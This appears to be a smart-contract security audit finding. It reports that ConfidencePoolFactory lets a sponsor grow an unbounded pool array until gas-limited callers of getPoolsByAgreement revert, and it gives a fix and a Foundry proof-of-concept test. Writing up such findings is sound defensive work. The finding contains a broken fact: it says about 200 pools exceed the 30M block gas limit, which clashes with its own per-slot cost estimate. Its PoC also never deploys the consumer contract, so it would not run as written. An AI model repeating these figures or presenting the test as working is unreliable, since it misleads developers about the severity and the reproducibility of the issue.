### Title
Unbounded `_poolsByAgreement` array enables sponsor-triggered OOG DoS on `getPoolsByAgreement` — (`File: src/ConfidencePoolFactory.sol`)

### Summary
`createPool` imposes no per-agreement pool count limit and the protocol explicitly allows many pools per agreement ("duplicates are allowed and curated off-chain"). `getPoolsByAgreement` returns the entire unbounded `_poolsByAgreement[agreement]` storage array with no pagination, so a sponsor who creates N pools for one agreement can make any on-chain caller that invokes `getPoolsByAgreement` in a gas-constrained context (callback, limited-gas external call) revert with out-of-gas.

### Finding Description
`createPool` appends to `_poolsByAgreement[agreement]` on every successful call ( [1](#0-0) ) with no upper bound on the array length. The only guards are: allowlisted token, valid agreement, `expiry >= now + 30 days`, and `IAgreement.owner() == msg.sender` ( [2](#0-1) ). None of these limit how many times the same sponsor calls `createPool` for the same agreement. `getPoolsByAgreement` then copies the entire storage array into memory and returns it: [3](#0-2)  — one cold SLOAD per slot (~2100 gas) plus memory-expansion cost, scaling linearly with N. At N ≈ 40–50 pools the function already exceeds a 100 000-gas budget; at N ≈ 200 it exceeds the 30M block gas limit for any caller. There is no pagination, no count-only alternative for on-chain callers (only `poolCountByAgreement` exists, [4](#0-3) ), and no guard inside `getPoolsByAgreement` itself.

### Impact Explanation
Any on-chain contract that calls `getPoolsByAgreement` in a gas-constrained context — a callback, a `try/catch` with a forwarded gas stipend, or any integration that enumerates pools before acting — will revert with OOG once N is large enough. Because the array only grows and is never pruned, the DoS is permanent for that agreement once the threshold is crossed. The factory's own `IConfidencePoolFactory` interface exposes `getPoolsByAgreement` as a first-class view, implying integrators are expected to call it.

### Likelihood Explanation
The sponsor is the agreement owner — an unprivileged actor requiring only a valid agreement and an already-allowlisted token (normal operational state). The protocol comment at line 34 explicitly states "duplicates are allowed," so repeated `createPool` calls are within the documented usage model. The cost per pool (one clone deploy + initialize, ~300 000–500 000 gas) means reaching N = 50 costs ~15–25 M gas — expensive but a one-time, permanent attack. The DoS is irreversible without a factory upgrade.

### Recommendation
Add a per-agreement pool cap in `createPool` (e.g., a configurable `maxPoolsPerAgreement` checked before the push), and add offset/limit parameters to `getPoolsByAgreement` so on-chain callers can paginate safely:

```solidity
function getPoolsByAgreement(address agreement, uint256 offset, uint256 limit)
    external view returns (address[] memory page);
```

Alternatively, expose only `poolCountByAgreement` for on-chain use and document `getPoolsByAgreement` as off-chain only — but a hard cap in `createPool` is still required to bound the array.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {ConfidencePoolFactory} from "src/ConfidencePoolFactory.sol";
// ... standard test setup imports

contract PoolConsumer {
    IConfidencePoolFactory factory;
    constructor(address f) { factory = IConfidencePoolFactory(f); }

    // Called with a capped gas forward to simulate a callback
    function process(address agreement) external returns (uint256 len) {
        address[] memory pools = factory.getPoolsByAgreement(agreement);
        len = pools.length;
    }
}

contract GetPoolsByAgreementDoSTest is Test {
    ConfidencePoolFactory factory;
    PoolConsumer consumer;
    address sponsor;
    address agreement;   // mock returning sponsor as owner, valid in registry
    address stakeToken;  // mock allowlisted ERC20

    function setUp() public {
        // deploy factory, mock agreement + registry + token, allowlist token
        // sponsor = agreement owner
    }

    function test_OOGAfterNPools() public {
        uint256 N = 60;
        vm.startPrank(sponsor);
        for (uint256 i = 0; i < N; i++) {
            factory.createPool(
                agreement, stakeToken,
                block.timestamp + 31 days,
                0, sponsor, new address[](0)
            );
        }
        vm.stopPrank();

        // Confirm N pools registered
        assertEq(factory.poolCountByAgreement(agreement), N);

        // Call getPoolsByAgreement with 100 000 gas — expect OOG revert
        (bool ok,) = address(consumer).call{gas: 100_000}(
            abi.encodeCall(consumer.process, (agreement))
        );
        assertFalse(ok, "expected OOG revert with N pools");

        // Confirm it succeeds with unlimited gas (not a logic bug, purely gas)
        (bool ok2,) = address(consumer).call(
            abi.encodeCall(consumer.process, (agreement))
        );
        assertTrue(ok2);
    }
}
```

The decisive assertion is `assertFalse(ok)` after the gas-capped call: it proves the DoS is real and triggered solely by the sponsor's repeated `createPool` calls, with the root cause entirely in `ConfidencePoolFactory.sol`.
